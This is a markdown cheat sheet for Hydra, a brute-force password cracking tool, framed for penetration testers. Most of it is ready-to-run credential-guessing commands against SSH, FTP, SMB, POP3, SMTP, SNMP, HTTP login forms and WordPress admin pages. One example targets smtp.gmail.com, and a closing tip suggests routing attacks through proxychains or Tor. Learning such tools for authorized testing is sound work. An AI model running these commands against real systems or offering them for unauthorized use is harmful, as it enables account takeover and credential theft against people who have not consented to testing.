# Hydra

Hydra is an open-source, fast, and flexible brute-force password cracking tool. It is widely used by penetration testers, red teams, and ethical hackers to test password security for various remote authentication services.

## Purpose of Hydra
Hydra is designed to perform brute-force attacks on remote authentication services. It attempts multiple combinations of usernames and passwords against a target to find valid credentials.
Key Use Cases:
- Identify weak or common passwords
- Test authentication security across services
- Support for a wide range of protocols (e.g., SSH, FTP, HTTP)
- Custom wordlists for targeted attacks
- Fast performance with parallel threads

## Basic Syntax
```bash
hydra [OPTIONS] -L <userlist> -P <passlist> <TARGET> <PROTOCOL>
```
- -L users.txt	File with usernames (each line = 1 user)
- -P passwords.txt	File with passwords to try
- <TARGET>	IP or hostname of the target
- <PROTOCOL>	Service to attack (e.g., ssh, ftp, http-get)


### Target Specification
| Option          | Description                                                    |
| --------------- | -------------------------------------------------------------- |
| `-l <login>`    | Use a single login name (e.g., `admin`)                    |
| `-L <file>`     | Use a list of usernames from file                          |
| `-p <password>` | Use a single password                                      |
| `-P <file>`     | Use a list of passwords from file                          |
| `-C <file>`     | Use a combo file** (format: `username:password`)             |
| `-M <file>`     | Use a list of target IPs from file                         |
| `-t <tasks>`    | Number of parallel tasks (default: 16)                     |
| `-s <port>`     | Custom port number                                         |
| `-S`            | Use SSL connection                                         |
| `-v / -V / -d`  | Verbose output (`-v`: normal, `-V`: very verbose, `-d`: debug) |
| `-f`            | Exit after first valid login found                             |
| `-o <file>`     | Save output to file                                            |
| `-u`            | Loop around users, not passwords (useful for SMTP, etc.)       |
| `-x`            | Generate passwords automatically (see below)                   |

### Advanced Options
| Option         | Description     |
| -------------- | --------------- |
| `-e nsr`       | Try **n**one, **s**ame as login, and **r**everse of login as password |
| `-R`           | Restore a previously saved session (`./hydra.restore`)  |
| `-I`           | Ignore restore file      |
| `-w <timeout>` | Set timeout (in seconds)           |
| `-W <wait>`    | Wait time between login attempts      |
| `-O`           | Use old SSL (useful for legacy systems)    |
| `-4`           | Force IPv4               |
| `-6`           | Force IPv6              |


### Example Protocols Hydra Supports
```bash
hydra -L users.txt -P pass.txt 192.168.1.4 ftp
hydra -l root -P rockyou.txt ssh://192.168.1.4
hydra -L logins.txt -P passwords.txt -s 8080 192.168.1.4 http-get /admin
hydra -l admin -P pass.txt 192.168.1.4 mysql
hydra -L users.txt -P pass.txt smtp.gmail.com smtp
```

| Protocol   | Hydra keyword |
| ---------- | ------------- |
| FTP        | `ftp`         |
| SSH        | `ssh`         |
| Telnet     | `telnet`      |
| HTTP GET   | `http-get`    |
| HTTP POST  | `http-post`   |
| HTTPS GET  | `https-get`   |
| HTTPS POST | `https-post`  |
| MySQL      | `mysql`       |
| RDP        | `rdp`         |
| VNC        | `vnc`         |
| SMB        | `smb`         |
| SNMP       | `snmp`        |
| POP3       | `pop3`        |
| IMAP       | `imap`        |
| LDAP       | `ldap`        |
| MSSQL      | `mssql`       |
| Redis      | `redis`       |
| PostgreSQL | `postgres`    |
| Teamspeak  | `teamspeak`   |
Use hydra -U to see all available modules installed in your version.

## Common Usage Examples
1. Brute-force FTP login
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.1.4
```
2. SSH with single username and password list
```bash
hydra -l root -P pass.txt ssh://192.168.1.4
```
3. HTTP POST login page (custom request)
```bash
hydra -L users.txt -P pass.txt 192.168.1.4 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login Failed"
```

## SSH
```bash
hydra -l root -P passwords.txt ssh://192.168.1.5
```
Brute-force SSH using root username and a list of passwords.
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.4 -t 4 -V
```
Brute-force SSH using a list of users and passwords.
```bash
hydra -v -V -u -L users.txt -p "" -t 1 -u 192.168.1.4 ssh
```
SSH brute-force using empty password and user list (test for blank passwords).
## FTP
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.4 ftp
```
FTP brute-force attack using a known username and wordlist.
## POP3 / SMTP
```bash
hydra -l USERNAME -P /usr/share/wordlists/nmap.lst -f -V 192.168.1.5 pop3
```
POP3 brute-force attack using username and password list.
```bash
hydra -P /usr/share/wordlists/nmap.lst 192.168.1.5 smtp -V
```
SMTP brute-force attack using password list.
## SMB
```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.5 smb
```
SMB brute-force attack with rockyou wordlist.
## HTTP-GET (Web Login)
```bash
hydra -L webapp.txt -P webapp.txt 192.168.1.5 http-get /admin
```
HTTP GET login brute-force (basic directory).
## Wordpress Login
```bash
hydra -l admin -P ./passwordlist.txt 192.168.1.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
Wordpress admin login brute-force.
##  HTTP Basic Auth
```bash
hydra -L users.txt -P passwords.txt 192.168.1.5 http-get /
```
Basic authentication brute-force.
## SNMP
```bash
hydra -P password-file.txt -v 192.168.1.5 snmp
```
SNMP brute-force using password list.



### Hydra Module Help
```bash
hydra -U
or
man hydra
```


- Use -f to stop once a valid password is found.
- Use -o output.txt to log successful credentials.
- Use with proxychains if routing through proxy/Tor.
- Combine with nmap for service discovery before launching Hydra.


